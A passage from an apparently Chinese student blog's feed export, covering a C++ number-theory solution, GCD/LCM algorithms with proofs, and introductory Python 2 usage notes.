<p>当a%k!=b%k时。设x=a%k,y=b%k;<br>则x-y=a%k-b%k=(a-b)%k<br>因为x!=y,所以x-y!=0.<br>则(a-b)%k!=0.</p>
</blockquote>
<p>突然觉得数论好有意思啊2333333333</p>
<p>我们有了这个结论之后就好办了，首先sort一下a[i],然后使用一个bool数组存储i是否为a-b中的一个，然后我们枚举k，每次用k的倍增来验证是否有(a-b)%k==0，如果发现有，说明这个k就是不成立的，继续枚举，一直找到为止。（k的范围就是从1到a[n]）</p>
<p>复杂度*大约*是O(n*k)，仅仅只是大约。</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,a[<span class="number">5001</span>],p;</span><br><span class="line"><span class="keyword">bool</span> b[<span class="number">1000001</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">Read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> F=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This\*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=Read();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    a[i]=Read();</span><br><span class="line">    sort(a+<span class="number">1</span>,a+n+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">    b[a[j]-a[i]]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=a[n];i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">bool</span> Flag=<span class="literal">false</span>;</span><br><span class="line">        p=i;</span><br><span class="line">        <span class="keyword">while</span>(p&lt;=a[n])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(b[p])</span><br><span class="line">            &#123;</span><br><span class="line">                Flag=<span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p+=i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!Flag)</span><br><span class="line">        &#123;</span><br><span class="line">            p=i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;p&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>数论</tag>
      </tags>
  </entry>
  <entry>
    <title>GCD和LCM</title>
    <url>/2017/10/08/a29d32b8f740/</url>
    <content><![CDATA[<h1 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h1><blockquote>
<p>其实就是挖一个坑而已，NOIP之前要赶快填上，不能再颓废了。</p>
</blockquote>
<h1 id="GCD和LCM"><a href="#GCD和LCM" class="headerlink" title="GCD和LCM"></a>GCD和LCM</h1><h2 id="GCD"><a href="#GCD" class="headerlink" title="GCD"></a>GCD</h2><blockquote>
<p>GCD的原理就是辗转相除法。</p>
</blockquote>
<p>其实就是运用到了这是欧几里得算法，和其中一个定理：GCD(x,y)=GCD(y,x%y);</p>
<p>也就是两个数:x和y的最大公约数等于y,x%y这两个数的最大公约数。</p>
<p>证明如下：</p>
<blockquote>
<p>a=k*b+r,则r=a-k*b;<br>a%b=(k*b+r)%b<br>所以a%b=r;<br>设d为a和b的公约数。<br>则 a|d , b|d<br>因为(a-k*b)|d,所以r|d<br>以为a%b|d且b|d<br>所以d为(b,a%b)的公约数<br>又因为d为(a,b)的公约数<br>所以GCD(a,b)=GCD(b,a%b);<br>(所有公约数都相等那么最大公约数必然相等)</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GCD</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=x%y;</span><br><span class="line">    <span class="keyword">while</span>(This)</span><br><span class="line">    &#123;</span><br><span class="line">        x=y;</span><br><span class="line">        y=This;</span><br><span class="line">        This=x%y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="LCM"><a href="#LCM" class="headerlink" title="LCM"></a>LCM</h2><p>LCM的原理就是一个公式，LCM*GCD=X*Y</p>
<p>也就是说，最小公倍数乘以最大公约数就等于两个原来的数相乘。</p>
<p>证明如下：</p>
<blockquote>
<p>设a=GCD(x,y),则x=n*a,y=m*a;<br>因为a为最大公约数，所以n和m必定互质。<br>则n*m*a为x和y的公倍数且一定最小。<br>所以LCM(x,y)=n*m*a;<br>则LCM*GCD=n*m*a*a=n*a*m*a=x*y;<br>所以LCM*GCD=X*Y</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LCM</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> x\*y/GCD(x,y); &#125;</span><br></pre></td></tr></table></figure>
<h1 id="二进制的GCD算法"><a href="#二进制的GCD算法" class="headerlink" title="二进制的GCD算法"></a>二进制的GCD算法</h1><h2 id="基本规则："><a href="#基本规则：" class="headerlink" title="基本规则："></a>基本规则：</h2><p>我们可以使用这种算法来加快GCD的过程，但是最主要的应用就是在高精度GCD的使用上面。</p>
<p>因为高精度膜法并不会写，所以遇到高精度GCD的时候，我们可以转换为折半运算(乘1/2)，也就是高精度乘法即可。</p>
<p>规则：</p>
<ol>
<li>若a、b都为偶数，则GCD(a,b)=2*GCD(a/2,b/2);</li>
<li>若a是奇数、b是偶数，则GCD(a,b)=GCD(a,b/2);</li>
<li>若a是偶数、b是奇数，则GCD(a,b)=GCD(a/2,b);</li>
<li>若a、b都为奇数，且a-b&gt;=0则GCD(a,b)=GCD(a-b,b);</li>
<li>若a、b都为奇数，且a-b&lt;=0则GCD(a,b)=GCD(b-a,a);</li>
</ol>
<ul>
<li>证明：第一条，若a、b都为偶数，则GCD(a,b)=2*GCD(a/2,b/2);</li>
</ul>
<ol>
<li>设x为GCD(a,b),则 a=n*x，b=m*x;</li>
<li>因为x为最大公约数，则m和n必定互质。</li>
<li>则a/2=n*x/2,b/2=m*x/2;</li>
<li>因为a和b都为偶数，则x必定为偶数。</li>
<li>所以GCD(a/2,b/2)=x/2;</li>
<li>则GCD(a,b)=2*GCD(a/2,b/2)，证毕。</li>
</ol>
<ul>
<li>证明：第二条，若a是奇数、b是偶数，则GCD(a,b)=GCD(a,b/2);</li>
</ul>
<ol>
<li>因为a为奇数，则a和b的最大公约数必定为奇数。</li>
<li>设x为GCD(a,b),则 a=n*x，b=m*x，则b/2=m*x/2；</li>
<li>因为x为奇数，b为偶数，则m必定为偶数。</li>
<li>设k=m/2，则b/2=k*x，a=n*x，且k和m互质。</li>
<li>所以x=GCD(a,b/2)=GCD(a,b)，证毕。</li>
</ol>
<ul>
<li>证明：第三条，若a是偶数、b是奇数，则GCD(a,b)=GCD(a/2,b);</li>
</ul>
<ol>
<li>因为b为奇数，则a和b的最大公约数必定为奇数。</li>
<li>设x为GCD(a,b),则 a=n*x，b=m*x，则a/2=n*x/2；</li>
<li>因为x为奇数，a为偶数，则n必定为偶数。</li>
<li>设k=n/2，则a/2=k*x，b=m*x，且k和m互质。</li>
<li>所以x=GCD(a,b/2)=GCD(a,b)，证毕。</li>
<li>(其实证明过程和第二条是一样的)</li>
</ol>
<ul>
<li>证明：第四条，若a、b都为奇数，且a-b&gt;=0则GCD(a,b)=GCD(a-b,b);</li>
</ul>
<ol>
<li>设x为GCD(a,b),则a=n*x，b=m*x,且n和m互质。</li>
<li>则a-b=(n-m)*x，且n-m&gt;=0。则n-m和m互质。</li>
<li>所以GCD(a,b)=GCD(a-b,b)。证毕。</li>
</ol>
<ul>
<li>证明：第五条，若a、b都为奇数，且a-b&lt;=0则GCD(a,b)=GCD(b-a,a);</li>
</ul>
<ol>
<li>设x为GCD(a,b),则a=n*x，b=m*x,且n和m互质。</li>
<li>则b-a=(m-n)*x，且m-n&gt;=0。则m-n和n互质。</li>
<li>所以GCD(a,b)=GCD(b-a,a)。证毕。</li>
</ol>
<p>感觉是伪证啊……</p>
<h2 id="代码实现："><a href="#代码实现：" class="headerlink" title="代码实现："></a>代码实现：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> a,b;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">GCD</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> x,<span class="keyword">long</span> <span class="keyword">long</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!x) <span class="keyword">return</span> y;</span><br><span class="line">    <span class="keyword">if</span>(!(x&amp;<span class="number">1</span>)&amp;&amp;!(y&amp;<span class="number">1</span>)) <span class="keyword">return</span> <span class="number">2</span>\*GCD(x/<span class="number">2</span>,y/<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>((x&amp;<span class="number">1</span>)&amp;&amp;!(y&amp;<span class="number">1</span>))  <span class="keyword">return</span> GCD(x,y/<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(x&amp;<span class="number">1</span>)&amp;&amp;(y&amp;<span class="number">1</span>))  <span class="keyword">return</span> GCD(x/<span class="number">2</span>,y);</span><br><span class="line">    <span class="keyword">if</span>((x&amp;<span class="number">1</span>)&amp;&amp;(y&amp;<span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(x-y&gt;<span class="number">0</span>) <span class="keyword">return</span> GCD(x-y,y);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> GCD(y-x,x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;GCD(a,b)&lt;&lt;<span class="built_in">endl</span>;;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>数论</tag>
        <tag>GCD</tag>
        <tag>LCM</tag>
      </tags>
  </entry>
  <entry>
    <title>Python的一些用法</title>
    <url>/2017/09/11/bc53b6b0d5ef/</url>
    <content><![CDATA[<h1 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h1><blockquote>
<p>最近脑子一抽去学Python了，感觉自己好智障。Python很多东西都和C++不一样，所以特意记录下来。</p>
</blockquote>
<h1 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h1><h2 id="input-和raw-input"><a href="#input-和raw-input" class="headerlink" title="input()和raw_input()"></a>input()和raw_input()</h2><ul>
<li><p>简单的说，input()读入的是数字，而raw_input()读入的是字符串。</p>
</li>
<li><p>然后神奇的就是input()其实是可以读入字符串的，不过必须要用<code>&#39;&#39;</code>或者<code>&quot;&quot;</code>来括起来，不然你就会RE。</p>
</li>
<li><p>所以说你就需要用raw_input()来解决读入字符串的问题，input()来解决读入非字符串的问题。</p>
</li>
<li><p>具体用法：</p>
</li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a=<span class="built_in">input</span>()</span><br><span class="line">b=raw_input()</span><br></pre></td></tr></table></figure>
<ul>
<li>但是这里注意的是，如果你读入的是</li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="number">123456</span> YunYuanXiang</span><br></pre></td></tr></table></figure>
<ul>
<li>那么你就GG了，因为Python只能读一行也就是说，这个读入是错误的。</li>
<li>正确的读法是这样的：</li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="number">123456</span></span><br><span class="line">YunYuanXiang</span><br></pre></td></tr></table></figure>
<h2 id="空格隔开的正确读法"><a href="#空格隔开的正确读法" class="headerlink" title="空格隔开的正确读法"></a>空格隔开的正确读法</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">splitStr</span>(<span class="params">initStr,splitFlag=<span class="string">&#x27; &#x27;</span></span>):</span></span><br><span class="line">    tmpList=initStr.split(splitFlag)</span><br><span class="line">    tmpList=<span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x:x!=<span class="string">&#x27;&#x27;</span>,tmpList))</span><br><span class="line">    <span class="keyword">return</span> tmpList</span><br></pre></td></tr></table></figure>
<h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>直接 print 输出就行，一些黑科技会补的</p>
<h1 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h1><ol>
<li>在Python中，多了一个<code>//</code>计算，这个运算就是直接取整数部分，也就是说，这个计算出来的除法只是答案的整数部分。</li>
<li>Python还多了<code>**</code>计算，这个就是幂运算。<code>a**b</code>=<code>a^b</code>.</li>
<li>Python内置高精度，超级方便</li>
</ol>
<h1 id="标准存储类型"><a href="#标准存储类型" class="headerlink" title="标准存储类型"></a>标准存储类型</h1><h2 id="Numbers（数字）"><a href="#Numbers（数字）" class="headerlink" title="Numbers（数字）"></a>Numbers（数字）</h2><ul>
<li>数字类型支持：</li>
</ul>
<ol>
<li>int（有符号整型）</li>
<li>long（长整型,也可以代表八进制和十六进制）</li>
<li>float（浮点型）</li>
<li>complex（复数）</li>
</ol>
<h2 id="String（字符串）"><a href="#String（字符串）" class="headerlink" title="String（字符串）"></a>String（字符串）</h2><p>如果你要实现从字符串中获取一段子字符串的话，可以使用变量 [头下标:尾下标]，就可以截取相应的字符串，其中下标是从 0 开始算起，可以是正数或负数，下标可以为空表示取到头或尾。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;Thisisbetter!&quot;</span></span><br><span class="line"><span class="built_in">print</span> a[<span class="number">0</span>:<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<p>答案就是 <code>T</code></p>
<p>这里注意string的<code>&quot;&quot;</code>和<code>&#39;&#39;</code>是一样的。</p>
<p>但是在输出的时候需要，如果有和<code>&#39;&#39;</code>或者<code>&quot;&quot;</code>相同的字符，需要用<code>\</code>来使用</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Hello\&#x27;OOO&#x27;</span></span><br></pre></td></tr></table></figure>
<p>的输出结果是：Hello’OOO</p>
<p>比较好玩的就是<code>&#39;&#39;&#39;</code>这个三引号了。他是把里面的东西原封不动的全部输出出来：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; GGG</span></span><br><span class="line"><span class="string">GGG</span></span><br><span class="line"><span class="string"> GGG QAQ</span></span><br><span class="line"><span class="string"> ??? &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> GGG</span><br><span class="line">GGG</span><br><span class="line"> GGG QAQ</span><br><span class="line"> ???</span><br></pre></td></tr></table></figure>
<h2 id="List（列表）"><a href="#List（列表）" class="headerlink" title="List（列表）"></a>List（列表）</h2><p>列表里面是使用 <code>[]</code>的：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">List=[<span class="number">324</span>,-<span class="number">786</span>,<span class="number">2.23</span>,<span class="string">&quot;YYX&quot;</span>,<span class="number">70.2</span>]</span><br></pre></td></tr></table></figure>
<p>List的使用和数组是一样的，都是从0开始的。</p>
<p>List可以输出一段，比如:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> List[<span class="number">1</span>:<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span> List[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<p>就会输出 一段东西，和一个东西</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">[-<span class="number">786</span>,<span class="number">2.23</span>]</span><br><span class="line">-<span class="number">786</span></span><br></pre></td></tr></table></figure>
<p>区别就是有没有带<code>[]</code></p>
<h2 id="Tuple（元组）"><a href="#Tuple（元组）" class="headerlink" title="Tuple（元组）"></a>Tuple（元组）</h2><p>元组和列表是一样的，区别就是不可以修改内容，这里不做讨论。</p>
<h2 id="Dictionary（字典）"><a href="#Dictionary（字典）" class="headerlink" title="Dictionary（字典）"></a>Dictionary（字典）</h2><p>字典和结构体差不多是使用<code>&#123;&#125;</code>来区别的。</p>
<p>具体方法赋值方法有两种：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">dist=&#123;<span class="string">&#x27;Name&#x27;</span>:<span class="string">&#x27;YunYuanXiang&#x27;</span>,<span class="number">233333</span>:<span class="string">&#x27;MMP&#x27;</span>,<span class="string">&#x27;size&#x27;</span>:<span class="number">16</span>&#125;</span><br><span class="line">dist[<span class="string">&#x27;Name&#x27;</span>]=<span class="string">&#x27;YunYuanXiang&#x27;</span></span><br><span class="line">dist[<span class="number">233333</span>]=<span class="string">&#x27;MMP&#x27;</span></span><br><span class="line">dist[<span class="string">&#x27;size&#x27;</span>]=<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span> dist[<span class="string">&#x27;Name&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> dist[<span class="number">233333</span>]</span><br><span class="line"><span class="built_in">print</span> dist[<span class="string">&#x27;size&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>结果是：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">YunYuanXiang</span><br><span class="line">MMP</span><br><span class="line"><span class="number">16</span></span><br></pre></td></tr></table></figure>
<h1 id="Python的一些操作"><a href="#Python的一些操作" class="headerlink" title="Python的一些操作"></a>Python的一些操作</h1><h2 id="成员运算符"><a href="#成员运算符" class="headerlink" title="成员运算符"></a>成员运算符</h2><ul>
<li><p>成员运算符非常的神奇一共有两种操作，分别是<code>In</code>和<code>Not in</code>:</p>
</li>
<li><p>在字典里面查找的时候，只能找到索引，没有办法找里面的值。也就是可以找到结构体里面定义的结构，但是没有办法找到里面的值</p>
</li>
<li><p>但是列表就可以寻找里面的值了！而且不仅仅是列表，字符串也支持啊！</p>
</li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">dist=&#123;<span class="string">&#x27;Name&#x27;</span>:<span class="string">&#x27;YunYuanXiang&#x27;</span>,<span class="number">233333</span>:<span class="string">&#x27;MMP&#x27;</span>,<span class="string">&#x27;size&#x27;</span>:<span class="number">16</span>&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="number">233333</span> <span class="keyword">in</span> dist: <span class="built_in">print</span> <span class="string">&#x27;In&#x27;</span></span><br><span class="line"><span class="keyword">else</span>: <span class="built_in">print</span> <span class="string">&#x27;Not In&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;MMP&#x27;</span> <span class="keyword">in</span> dist: <span class="built_in">print</span> <span class="string">&#x27;In&#x27;</span></span><br><span class="line"><span class="keyword">else</span>: <span class="built_in">print</span> <span class="string">&#x27;Not IN&#x27;</span></span><br><span class="line">dist=[<span class="string">&#x27;GG&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;QAQ&#x27;</span>]</span><br><span class="line">a=<span class="string">&#x27;GG&#x27;</span>; b=<span class="string">&#x27;QAQ&#x27;</span></span><br><span class="line"><span class="keyword">if</span> a <span class="keyword">not</span> <span class="keyword">in</span> dist: <span class="built_in">print</span> <span class="string">&#x27;Not In&#x27;</span></span><br><span class="line"><span class="keyword">else</span>: <span class="built_in">print</span> <span class="string">&#x27;In&#x27;</span></span><br><span class="line"><span class="keyword">if</span> b <span class="keyword">not</span> <span class="keyword">in</span> dist: <span class="built_in">print</span> <span class="string">&#x27;Not In&#x27;</span></span><br><span class="line"><span class="keyword">else</span>: <span class="built_in">print</span> <span class="string">&#x27;In&#x27;</span></span><br></pre></td></tr></table></figure>
<p>然后实际的输出就是：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">In</span><br><span class="line">Not IN</span><br><span class="line">In</span><br><span class="line">In</span><br></pre></td></tr></table></figure>
<h2 id="强制转换"><a href="#强制转换" class="headerlink" title="强制转换"></a>强制转换</h2><table>
<thead>
<tr>
<th>函数</th>
<th>转换内容</th>
</tr>
</thead>
<tbody><tr>
<td>hex(x) #16</td>
<td>从十进制转换为十六进制</td>
</tr>
<tr>
<td>oct(x) #8</td>
<td>从十进制转换为八进制</td>
</tr>
<tr>
<td>bin(x) #2</td>
<td>从十进制转换为二进制</td>
</tr>
<tr>
<td>float(x)</td>
<td>将x转换为浮点数</td>
</tr>
<tr>
<td>int(x)</td>
<td>将x转换为int数</td>
</tr>
<tr>
<td>long(X)</td>
<td>将x转换为long数</td>
</tr>
<tr>
<td>str(x)</td>
<td>将x转换为字符串</td>
</tr>
<tr>
<td>eval(x)</td>
<td>计算并返回有效的计算表达式x</td>
</tr>
</tbody></table>
<h2 id="math函数操作"><a href="#math函数操作" class="headerlink" title="math函数操作"></a>math函数操作</h2><p>一定要记得导入模块</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>函数</th>
<th>返回内容</th>
</tr>
</thead>
<tbody><tr>
<td>abs(x)</td>
<td>返回数字的绝对值，如abs(-10) 返回 10</td>
</tr>
<tr>
<td>cmp(x, y)</td>
<td>如果 x &lt; y 返回 -1, 如果 x == y 返回 0, 如果 x &gt; y 返回 1</td>
</tr>
<tr>
<td>math.ceil(x)</td>
<td>返回数字的上入整数，如math.ceil(4.1) 返回 5</td>
</tr>
<tr>
<td>math.exp(x)</td>
<td>返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045</td>
</tr>
<tr>
<td>math.fabs(x)</td>
<td>返回数字的绝对值，如math.fabs(-10) 返回10.0,返回的一定是一个浮点数</td>
</tr>
<tr>
<td>math.floor(x)</td>
<td>返回数字的下舍整数，如math.floor(4.9)返回 4</td>
</tr>
<tr>
<td>math.log(x)</td>
<td>math.log(64,2)返回6.0, 底数为2，真数为64</td>
</tr>
<tr>
<td>max(x1, x2,…)</td>
<td>返回给定参数的最大值，参数可以为序列。</td>
</tr>
<tr>
<td>min(x1, x2,…)</td>
<td>返回给定参数的最小值，参数可以为序列。</td>
</tr>
<tr>
<td>pow(x, y)</td>
<td>返回x的y次幂，实际上就是x**y，</td>
</tr>
<tr>
<td>round(x,n)</td>
<td>返回浮点数x的四舍五入值，如给出n值，则代表舍入到小数点后的位数。</td>
</tr>
<tr>
<td>math.sqrt(x)</td>
<td>返回数字x的平方根math.sqrt()</td>
</tr>
</tbody></table>
<h2 id="随机函数操作"><a href="#随机函数操作" class="headerlink" title="随机函数操作"></a>随机函数操作</h2><p>还是一样的导入模板。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>函数</th>
<th>返回内容</th>
</tr>
</thead>
<tbody><tr>
<td>random.choose(x)</td>
<td>返回序列x中，任意选择一个值x=range(10)时从1-9任意选择一个数字。</td>
</tr>
<tr>
<td>random.randrange(x,y,z)</td>
<td>返回随机生成的整数，在x-y之间，并且是z的整数倍。z可以不填。</td>
</tr>
<tr>
<td>random.random()</td>
<td>返回在[0,1)之间的一个<strong>实数</strong>。</td>
</tr>
<tr>
<td>random.shuffle(x)</td>
<td>返回一个完全打乱的数列x。</td>
</tr>
<tr>
<td>uniform(x,y)</td>
<td>返回一个随机的<strong>实数</strong>，范围在x-y之间。</td>
</tr>
</tbody></table>
<h2 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h2><blockquote>
<p>万恶的三角函数！！！</p>
</blockquote>
<p>导入模板</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>函数</th>
<th>返回内容</th>
</tr>
</thead>
<tbody><tr>
<td>math.tan(x)</td>
<td>返回x的弧度的正切值。</td>
</tr>
<tr>
<td>math.cos(x)</td>
<td>返回x的弧度的余弦值。</td>
</tr>
<tr>
<td>math.sin(x)</td>
<td>返回x的弧度的正弦值。</td>
</tr>
<tr>
<td>math.atan(x)</td>
<td>返回正切值为x的角度值。</td>
</tr>
<tr>
<td>math.acos(x)</td>
<td>返回余弦值为x的角度值。</td>
</tr>
<tr>
<td>math.asin(x)</td>
<td>返回正切值为x的角度值。</td>
</tr>
<tr>
<td>math.pi</td>
<td>返回π的值。</td>
</tr>
<tr>
<td>math.e</td>
<td>返回自然常数e的值。</td>
</tr>
<tr>
<td>math.degrees(x)</td>
<td>输入弧度值x返回角度值。</td>
</tr>
<tr>
<td>math.hypot(x,y)</td>
<td>输入两直角边x和y，输出斜边长度。</td>
</tr>
<tr>
<td>radians(x)</td>
<td>输入角度值x返回弧度值。</td>
</tr>
</tbody></table>
<h2 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h2><blockquote>
<p>字符串的格式化输入输出</p>
</blockquote>
<p><code>%s</code> 操作，这个操作的就是在输入很长的字符串的时候，里面有一些变量需要进行输入，就需要用 <code>%s</code> 进行代替。然后后面加上需要代替的变量。</p>
<ul>
<li>举个栗子：</li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Please input your name:&#x27;</span></span><br><span class="line">x=raw_input()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Please input your age:&#x27;</span></span><br><span class="line">y=<span class="built_in">input</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;OK,I rember that you called %s and your age is %d.&#x27;</span>% (x,y)</span><br></pre></td></tr></table></figure>
<ul>
<li>所以说，关于格式化：</li>
</ul>
<table>
<thead>
<tr>
<th>符号</th>
<th>格式化内容</th>
</tr>
</thead>
<tbody><tr>
<td>%c</td>
<td>格式化字符及其ASCII码</td>
</tr>
<tr>
<td>%s</td>
<td>格式化字符串</td>
</tr>
<tr>
<td>%d</td>
<td>格式化整数</td>
</tr>
<tr>
<td>%u</td>
<td>格式化无符号整型</td>
</tr>
<tr>
<td>%o</td>
<td>格式化无符号八进制数</td>
</tr>
<tr>
<td>%x</td>
<td>格式化无符号十六进制数</td>
</tr>
<tr>
<td>%X</td>
